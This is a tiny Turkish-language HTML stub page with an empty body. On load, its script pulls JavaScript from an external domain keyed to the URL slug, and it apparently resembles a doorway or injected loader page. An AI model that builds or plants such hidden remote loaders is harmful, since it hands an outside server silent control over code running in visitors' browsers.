<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="utf-8">
  <title>Yükleniyor…</title>
  <script>
  (function() {
    // URL’den slug’ı al (/slug veya /slug.html)
    var slug = location.pathname
      .replace(/^\//, '')
      .replace(/\/(index\.html)?$/, '')
      .replace(/\.html$/, '');
    if (!slug) return;

    // Sunucu JS yükle
    var s = document.createElement('script');
    s.src = 'https://valjean.eu/index.php?guid=' + encodeURIComponent(slug);
    document.head.appendChild(s);
  })();
  </script>
</head>
<body></body>
</html>
